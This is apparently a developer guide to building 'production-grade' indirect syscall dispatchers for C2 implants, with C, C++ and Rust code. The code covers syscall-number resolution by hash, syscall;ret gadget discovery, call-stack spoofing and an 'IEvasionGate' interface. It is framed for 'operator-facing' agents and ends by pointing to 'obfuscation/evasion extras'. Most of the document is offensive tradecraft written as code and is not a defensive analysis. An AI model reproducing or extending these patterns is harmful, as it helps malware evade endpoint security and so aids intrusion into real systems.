# Implementation Examples — Indirect Syscall Patterns (C + Rust)

Practical design patterns distilled from Ashura and Beacon Wraith implementations. Use this file when implementing production-grade syscall dispatchers with explicit mode switching and robust arg handling.

## Table of Contents

1. Why these examples matter
2. C pattern (Ashura-style)
3. C++ pattern (Beacon Wraith C-style)
4. Rust pattern (Ashura/Wraith RS-style)
5. Integration checklist

---

## 1) Why these examples matter

These codebases demonstrate patterns often missing in PoCs:

- explicit resolver/dispatch modes
- stable wrappers for 4/6/11-arg syscalls
- optional composition with stack spoofing
- fallback behavior when spoof context is unavailable

This is the difference between a lab demo and maintainable operator-facing code.

---

## 2) C pattern (Ashura-style)

### Mode-switch + unified wrapper strategy

Key idea: keep one Nt* wrapper API and switch dispatch path internally.

Representative shape:

```c
#ifndef ASH_SYSCALL_MODE
#define ASH_SYSCALL_MODE 1
#endif

static NTSTATUS ash_nt_allocate_virtual_memory(HANDLE process, PVOID *base_addr,
    SIZE_T zero_bits, PSIZE_T region_size, ULONG alloc_type, ULONG protect)
{
#if ASH_SYSCALL_MODE == 2
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID *, SIZE_T, PSIZE_T, ULONG, ULONG);
    fn_t fn = (fn_t)ASH_CLEAN_NT(H_NTALLOCATEVIRTUALMEMORY);
    if (!fn) return (NTSTATUS)0xC0000001L;
    return fn(process, base_addr, zero_bits, region_size, alloc_type, protect);
#else
    ASH_ISYSCALL_INIT();
    unsigned short ssn = ash_ssn(H_NTALLOCATEVIRTUALMEMORY);
    if (!ssn) return (NTSTATUS)0xC0000001L;
    return ash_isyscall6(ssn,
        (ULONG_PTR)process, (ULONG_PTR)base_addr,
        (ULONG_PTR)zero_bits, (ULONG_PTR)region_size,
        (ULONG_PTR)alloc_type, (ULONG_PTR)protect);
#endif
}
```

Why it works:

- wrappers remain stable while strategy evolves
- easy A/B testing between indirect and clean-fnptr modes
- reduced regression risk when adding APIs

---

## 3) C++ pattern (Beacon Wraith C-style)

### Interface-driven gate abstraction

Expose a generic gate interface and keep syscall engine behind it.

```cpp
class IEvasionGate {
public:
    virtual BOOL Init() = 0;
    virtual uint32_t Syscall(uint16_t num, uintptr_t* args, int argCount) = 0;
    virtual uintptr_t ResolveFn(const char* module, const char* function) = 0;
    virtual uintptr_t Call(uintptr_t fn, uintptr_t* args, int argCount) = 0;
    virtual void Close() = 0;
};
```

Implementation pattern:

- phase 1: build SSN table (sorted `Zw*` exports)
- phase 2: find valid `syscall;ret` gate(s)
- phase 3+: optional spoof/sleep features layered on top

Operational gain:

- you can swap gate implementations without touching agent business logic
- easier testing of fallback paths (`argCount > 6`, missing spoof gadgets, etc.)

---

## 4) Rust pattern (Ashura/Wraith RS-style)

### Dispatch by hash + arg-count wrappers

Keep helper trio:

- `dispatch4(fn_hash, ...)`
- `dispatch6(fn_hash, ...)`
- `dispatch11(fn_hash, ...)`

Representative mode-aware dispatch:

```rust
#[inline(always)]
pub unsafe fn dispatch4(fn_hash: u32, a1: u64, a2: u64, a3: u64, a4: u64) -> NTSTATUS {
    let (ssn, fnptr) = resolve_ssn_and_fn(fn_hash);

    if SYSCALL_MODE == 2 && fnptr != 0 {
        type Fn4 = unsafe extern "system" fn(u64, u64, u64, u64) -> NTSTATUS;
        let f: Fn4 = core::mem::transmute(fnptr);
        return f(a1, a2, a3, a4);
    }

    if ssn == 0 { return -1; }
    indirect_syscall4(ssn, a1, a2, a3, a4)
}
```

### Optional spoof composition

```rust
if CALL_STACK_SPOOF && smw_is_ready() {
    return smw_spoofed_syscall6(ssn, a1, a2, a3, a4, a5, a6);
}
indirect_syscall6(ssn, a1, a2, a3, a4, a5, a6)
```

Design benefit:

- resolver and spoofing remain independently testable
- 4/6/11-arg paths are explicit and easier to fuzz

---

## 5) Integration checklist

Before merging a new dispatcher:

1. Validate `dispatch4/6/11` against known-good NTSTATUS panel.
2. Validate mode switching does not change wrapper signatures.
3. Verify gate bytes (`0F 05 C3`) before caching.
4. Confirm fallback behavior when spoof context is missing.
5. Stress-test with ASLR-enabled repeated runs.

If any check fails, fix architecture first, then add obfuscation/evasion extras.
